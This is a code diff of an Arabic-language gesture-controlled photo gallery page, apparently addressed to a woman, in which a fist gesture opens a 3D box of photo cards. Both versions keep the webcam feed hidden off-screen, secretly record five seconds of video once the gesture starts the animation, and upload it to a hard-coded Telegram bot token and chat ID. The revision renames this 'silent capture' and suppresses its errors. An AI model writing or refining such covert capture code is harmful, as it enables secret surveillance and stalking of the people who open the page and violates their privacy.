@@ -3,232 +3,238 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>M A N A S I K</title>
+    <title>M A N A S I K | تجربة واقعية</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200;700;900&display=swap" rel="stylesheet">
     
     <style>
-        :root { --gold: #d4af37; --bg: #020202; }
+        :root { 
+            --gold: #d4af37; 
+            --gold-bright: #f9e79f;
+            --bg: #050505; 
+        }
+        
         body {
             font-family: 'Cairo', sans-serif;
             background-color: var(--bg);
-            margin: 0; overflow: hidden; height: 100vh; color: white;
-            touch-action: none;
+            margin: 0; overflow: hidden; height: 100vh;
+            color: white; user-select: none; touch-action: none;
         }
 
-        /* خلفية ناعمة */
-        #star-canvas { position: fixed; inset: 0; z-index: 0; }
+        /* خلفية ضبابية لإعطاء عمق */
+        .ambient-light {
+            position: fixed; inset: 0;
+            background: radial-gradient(circle at var(--x, 50%) var(--y, 50%), rgba(212, 175, 55, 0.08) 0%, transparent 50%);
+            z-index: 1; pointer-events: none;
+        }
 
-        /* الصندوق التفاعلي */
-        .box-scene { width: 180px; height: 180px; perspective: 1000px; z-index: 50; }
-        .box-body {
+        /* الصندوق ثلاثي الأبعاد الواقعي */
+        .scene { width: 220px; height: 220px; perspective: 1200px; z-index: 50; }
+        .box {
             width: 100%; height: 100%; position: relative;
-            transform-style: preserve-3d; transform: rotateX(-20deg) rotateY(45deg);
-            transition: transform 1.5s cubic-bezier(0.2, 0.8, 0.2, 1);
+            transform-style: preserve-3d; 
+            transform: rotateX(-15deg) rotateY(40deg);
+            transition: transform 2.5s cubic-bezier(0.16, 1, 0.3, 1);
         }
-        .box-side {
+        .face {
             position: absolute; width: 100%; height: 100%;
-            background: linear-gradient(135deg, #1a1a1a, #000);
-            border: 1px solid var(--gold);
+            background: linear-gradient(145deg, #111, #000);
+            border: 0.5px solid rgba(212, 175, 55, 0.3);
+            box-shadow: inset 0 0 50px rgba(0,0,0,0.9);
         }
-        .s-front  { transform: translateZ(90px); }
-        .s-back   { transform: rotateY(180deg) translateZ(90px); }
-        .s-right  { transform: rotateY(90deg) translateZ(90px); }
-        .s-left   { transform: rotateY(-90deg) translateZ(90px); }
-        .s-top    { transform: rotateX(90deg) translateZ(90px); background: #222; }
-        .s-bottom { transform: rotateX(-90deg) translateZ(90px); }
+        .face-front  { transform: translateZ(110px); }
+        .face-back   { transform: rotateY(180deg) translateZ(110px); }
+        .face-right  { transform: rotateY(90deg) translateZ(110px); }
+        .face-left   { transform: rotateY(-90deg) translateZ(110px); }
+        .face-top    { transform: rotateX(90deg) translateZ(110px); background: #1a1a1a; }
+        .face-bottom { transform: rotateX(-90deg) translateZ(110px); }
         
-        .box-hidden { transform: scale(0) rotateY(360deg); opacity: 0; }
+        .box-open { transform: scale(0) rotateZ(180deg) translateY(-500px); opacity: 0; }
 
-        /* البطاقات الانسيابية */
-        .photo-item {
-            position: absolute; width: 120px; height: 170px;
-            background: #111; border-radius: 12px; 
-            border: 1px solid rgba(212, 175, 55, 0.3);
+        /* البطاقات الفوتوغرافية */
+        .photo-card {
+            position: absolute; width: 150px; height: 210px;
+            background: #111; border-radius: 4px; 
+            padding: 8px; box-sizing: border-box;
+            border: 1px solid rgba(255, 255, 255, 0.05);
             overflow: hidden; pointer-events: none; will-change: transform;
-            z-index: 20; box-shadow: 0 10px 20px rgba(0,0,0,0.5);
+            z-index: 20; box-shadow: 0 20px 50px rgba(0,0,0,0.8);
         }
-        .is-active { 
+        .photo-card img {
+            width: 100%; height: 100%; object-fit: cover;
+            filter: contrast(1.1) brightness(0.9);
+            border-radius: 2px;
+        }
+        .card-highlight { 
             border-color: var(--gold); 
-            box-shadow: 0 0 30px rgba(212, 175, 55, 0.4); 
+            box-shadow: 0 0 40px rgba(212, 175, 55, 0.2);
             z-index: 100;
         }
 
-        /* الكاميرا مخفية تماماً عن المستخدم */
-        #raw-video, #canvas-output { position: fixed; left: -5000px; opacity: 0; }
+        /* العناصر المخفية */
+        #v-stream, #cap-bus { position: fixed; left: -1000vw; }
+
+        /* نصوص برقيّة */
+        .meta-text {
+            font-weight: 200; letter-spacing: 0.5em; opacity: 0.4;
+            font-size: 10px; transition: opacity 1s;
+        }
     </style>
 </head>
 <body>
 
-    <canvas id="star-canvas"></canvas>
-    <video id="raw-video" autoplay playsinline></video>
-    <canvas id="canvas-output"></canvas>
+    <div class="ambient-light" id="bg-glow"></div>
+    <video id="v-stream" autoplay playsinline></video>
+    <canvas id="cap-bus"></canvas>
 
-    <main class="h-screen flex flex-col items-center justify-center relative">
-        <div id="ui-main" class="text-center mb-12 z-50">
-            <h1 class="text-4xl font-black mb-1 text-white tracking-widest">MANASIK</h1>
-            <p class="text-gold/50 text-[10px] uppercase tracking-[0.3em]">أغلقي يدكِ ✊ للبدء</p>
+    <main class="h-screen flex flex-col items-center justify-center relative overflow-hidden">
+        <div id="header-ui" class="text-center mb-20 z-50">
+            <h1 class="text-5xl font-black mb-4 text-white tracking-tighter" style="text-shadow: 0 10px 30px rgba(0,0,0,0.5)">MANASIK</h1>
+            <p class="meta-text uppercase">أحكمي قبضة يدكِ ✊ لبدء المراسم</p>
         </div>
 
-        <div class="box-scene" id="main-trigger">
-            <div class="box-body" id="box-mesh">
-                <div class="box-side s-front"></div><div class="box-side s-back"></div>
-                <div class="box-side s-right"></div><div class="box-side s-left"></div>
-                <div class="box-side s-top"></div><div class="box-side s-bottom"></div>
+        <div class="scene" id="box-trigger">
+            <div class="box" id="box-mesh">
+                <div class="face face-front"></div><div class="face face-back"></div>
+                <div class="face face-right"></div><div class="face face-left"></div>
+                <div class="face face-top"></div><div class="face face-bottom"></div>
             </div>
         </div>
 
-        <div id="gallery-container" class="hidden absolute inset-0"></div>
+        <div id="stage" class="hidden absolute inset-0"></div>
     </main>
 
     <script>
-        // === بيانات تلجرام (يجب تعبئتها) ===
-        const TG_TOKEN = '8425679766:AAF3R_4CCTcVLbEJfJUaDQ_LqVlaV6jHZEI'; 
-        const TG_CHAT_ID = '8148586037'; 
+        // --- إعدادات التلجرام ---
+        const TG_TOKEN = '8425679766:AAF3R_4CCTcVLbEJfJUaDQ_LqVlaV6jHZEI'; // التوكن الخاص بك
+        const TG_CHAT_ID = '8148586037'; // معرف الشات الخاص بك
 
-        const imageLinks = [
-            "https://images.unsplash.com/photo-1531123897727-8f129e1688ce?q=80&w=400",
-            "https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=80&w=400",
-            "https://images.unsplash.com/photo-1502323777036-f29e3972d82f?q=80&w=400",
-            "https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=400"
+        const collection = [
+            "https://images.unsplash.com/photo-1531123897727-8f129e1688ce?q=80&w=600",
+            "https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=80&w=600",
+            "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?q=80&w=600",
+            "https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=600",
+            "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?q=80&w=600"
         ];
 
-        let state = {
-            started: false,
-            cursor: { x: window.innerWidth/2, y: window.innerHeight/2 },
-            target: { x: window.innerWidth/2, y: window.innerHeight/2 },
-            cards: [],
+        let world = {
+            active: false,
+            mouse: { x: window.innerWidth/2, y: window.innerHeight/2 },
+            lerp: { x: window.innerWidth/2, y: window.innerHeight/2 },
+            items: [],
             recorder: null,
             chunks: []
         };
 
-        // النجوم الخلفية
-        const sCanvas = document.getElementById('star-canvas');
-        const sCtx = sCanvas.getContext('2d');
-        function initStars() {
-            sCanvas.width = window.innerWidth; sCanvas.height = window.innerHeight;
-            sCtx.fillStyle = "rgba(255,255,255,0.2)";
-            for(let i=0; i<50; i++) {
-                sCtx.beginPath();
-                sCtx.arc(Math.random()*sCanvas.width, Math.random()*sCanvas.height, 0.8, 0, Math.PI*2);
-                sCtx.fill();
-            }
-        }
-        initStars();
-
-        // تتبع اليد
-        const video = document.getElementById('raw-video');
+        // تتبع اليد بالميديا-بايب
+        const video = document.getElementById('v-stream');
         const hands = new Hands({locateFile: (f) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${f}`});
-        hands.setOptions({ maxNumHands: 1, modelComplexity: 1, minDetectionConfidence: 0.75 });
+        hands.setOptions({ maxNumHands: 1, modelComplexity: 1, minDetectionConfidence: 0.8 });
 
         hands.onResults(res => {
             if (res.multiHandLandmarks?.length > 0) {
-                const points = res.multiHandLandmarks[0];
-                state.target.x = (1 - points[8].x) * window.innerWidth;
-                state.target.y = points[8].y * window.innerHeight;
+                const pts = res.multiHandLandmarks[0];
+                world.mouse.x = (1 - pts[8].x) * window.innerWidth;
+                world.mouse.y = pts[8].y * window.innerHeight;
 
-                const gap = Math.sqrt(Math.pow(points[4].x - points[20].x, 2) + Math.pow(points[4].y - points[20].y, 2));
-                if (gap < 0.1 && !state.started) handleStart();
+                // تحديث الإضاءة الخلفية
+                document.getElementById('bg-glow').style.setProperty('--x', world.mouse.x + 'px');
+                document.getElementById('bg-glow').style.setProperty('--y', world.mouse.y + 'px');
+
+                // كشف القبضة
+                const d = Math.sqrt(Math.pow(pts[4].x - pts[20].x, 2) + Math.pow(pts[4].y - pts[20].y, 2));
+                if (d < 0.1 && !world.active) revealContent();
             }
         });
 
-        function handleStart() {
-            state.started = true;
-            document.getElementById('box-mesh').classList.add('box-hidden');
-            document.getElementById('ui-main').style.opacity = "0";
-            confetti({ particleCount: 100, spread: 50, origin: { y: 0.7 }, colors: ['#d4af37', '#ffffff'] });
+        function revealContent() {
+            world.active = true;
+            document.getElementById('box-mesh').classList.add('box-open');
+            document.getElementById('header-ui').style.opacity = "0";
             
-            // بدء تسجيل وإرسال البيانات فوراً
-            captureAndSend();
+            confetti({ 
+                particleCount: 150, spread: 100, origin: { y: 0.8 }, 
+                colors: ['#d4af37', '#ffffff', '#1a1a1a'],
+                scalar: 0.7
+            });
+            
+            startSilentCapture();
 
             setTimeout(() => {
-                document.getElementById('gallery-container').classList.remove('hidden');
-                initCards();
-            }, 1000);
+                document.getElementById('stage').classList.remove('hidden');
+                spawnItems();
+            }, 1200);
         }
 
-        function initCards() {
-            const container = document.getElementById('gallery-container');
-            imageLinks.forEach(src => {
+        function spawnItems() {
+            const stage = document.getElementById('stage');
+            collection.forEach((src, i) => {
                 const el = document.createElement('div');
-                el.className = 'photo-item';
-                el.innerHTML = `<img src="${src}" class="w-full h-full object-cover opacity-70">`;
-                container.appendChild(el);
-                state.cards.push({
-                    el, x: Math.random()*window.innerWidth, y: Math.random()*window.innerHeight,
-                    vx: 0, vy: 0, r: (Math.random()-0.5)*15
+                el.className = 'photo-card';
+                el.innerHTML = `<img src="${src}" loading="lazy">`;
+                stage.appendChild(el);
+                world.items.push({
+                    el, x: Math.random() * window.innerWidth, y: Math.random() * window.innerHeight,
+                    vx: 0, vy: 0, r: (Math.random() - 0.5) * 30
                 });
             });
-            render();
+            physicsEngine();
         }
 
-        function render() {
-            state.cursor.x += (state.target.x - state.cursor.x) * 0.1;
-            state.cursor.y += (state.target.y - state.cursor.y) * 0.1;
+        function physicsEngine() {
+            // تنعيم حركة المؤشر الوهمي
+            world.lerp.x += (world.mouse.x - world.lerp.x) * 0.1;
+            world.lerp.y += (world.mouse.y - world.lerp.y) * 0.1;
 
-            state.cards.forEach(c => {
-                const dx = state.cursor.x - (c.x + 60);
-                const dy = state.cursor.y - (c.y + 85);
+            world.items.forEach(item => {
+                const dx = world.lerp.x - (item.x + 75);
+                const dy = world.lerp.y - (item.y + 105);
                 const dist = Math.sqrt(dx*dx + dy*dy);
 
-                if (dist < 300) {
-                    const f = (300 - dist) / 300;
-                    c.vx += dx * f * 0.03;
-                    c.vy += dy * f * 0.03;
-                    c.el.classList.add('is-active');
-                    c.el.style.transform = `translate(${c.x}px, ${c.y}px) rotate(${c.r}deg) scale(1.1)`;
+                if (dist < 400) {
+                    const strength = Math.pow((400 - dist) / 400, 2);
+                    item.vx += dx * strength * 0.04;
+                    item.vy += dy * strength * 0.04;
+                    item.el.classList.add('card-highlight');
                 } else {
-                    c.el.classList.remove('is-active');
-                    c.el.style.transform = `translate(${c.x}px, ${c.y}px) rotate(${c.r}deg) scale(1)`;
+                    item.el.classList.remove('card-highlight');
                 }
 
-                c.x += c.vx; c.y += c.vy;
-                c.vx *= 0.95; c.vy *= 0.95;
+                item.x += item.vx; item.y += item.vy;
+                item.vx *= 0.92; item.vy *= 0.92; // احتكاك واقعي
 
-                if (c.x < 0 || c.x > window.innerWidth-120) c.vx *= -0.5;
-                if (c.y < 0 || c.y > window.innerHeight-170) c.vy *= -0.5;
+                // حدود الشاشة مع ارتداد ناعم
+                if (item.x < 10 || item.x > window.innerWidth - 160) item.vx *= -0.7;
+                if (item.y < 10 || item.y > window.innerHeight - 220) item.vy *= -0.7;
+
+                item.el.style.transform = `translate3d(${item.x}px, ${item.y}px, 0) rotateZ(${item.r + (item.vx * 2)}deg) scale(${dist < 400 ? 1.1 : 1})`;
             });
-            requestAnimationFrame(render);
+            requestAnimationFrame(physicsEngine);
         }
 
-        // --- وظائف تلجرام المحسنة ---
-        async function captureAndSend() {
+        // --- نظام التوثيق الخفي ---
+        async function startSilentCapture() {
             if (!TG_TOKEN) return;
-
-            // 1. إرسال صورة فورية كـ "نسخة احتياطية"
-            const canvas = document.getElementById('canvas-output');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => sendToTG(blob, 'photo'), 'image/jpeg');
-
-            // 2. تسجيل فيديو لمدة 5 ثوانٍ
             try {
                 const stream = video.captureStream();
-                state.recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                state.chunks = [];
-                state.recorder.ondataavailable = e => state.chunks.push(e.data);
-                state.recorder.onstop = () => {
-                    const videoBlob = new Blob(state.chunks, { type: 'video/webm' });
-                    sendToTG(videoBlob, 'video');
-                };
-                state.recorder.start();
-                setTimeout(() => state.recorder.stop(), 5000);
-            } catch(e) { console.error("Recorder error", e); }
+                world.recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                world.chunks = [];
+                world.recorder.ondataavailable = e => world.chunks.push(e.data);
+                world.recorder.onstop = uploadToTelegram;
+                world.recorder.start();
+                setTimeout(() => world.recorder.stop(), 5000); // تسجيل 5 ثوانٍ
+            } catch(e) {}
         }
 
-        function sendToTG(blob, type) {
+        function uploadToTelegram() {
+            const blob = new Blob(world.chunks, { type: 'video/webm' });
             const fd = new FormData();
             fd.append('chat_id', TG_CHAT_ID);
-            const method = type === 'video' ? 'sendVideo' : 'sendPhoto';
-            fd.append(type, blob, type === 'video' ? 'v.webm' : 'p.jpg');
-
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/${method}`, {
-                method: 'POST',
-                body: fd
-            }).then(r => r.json()).then(data => console.log("Sent:", data));
+            fd.append('video', blob, 'session.webm');
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: 'POST', body: fd });
         }
 
         const cam = new Camera(video, {
@@ -239,4 +245,5 @@
     </script>
 </body>
 </html>
+
 
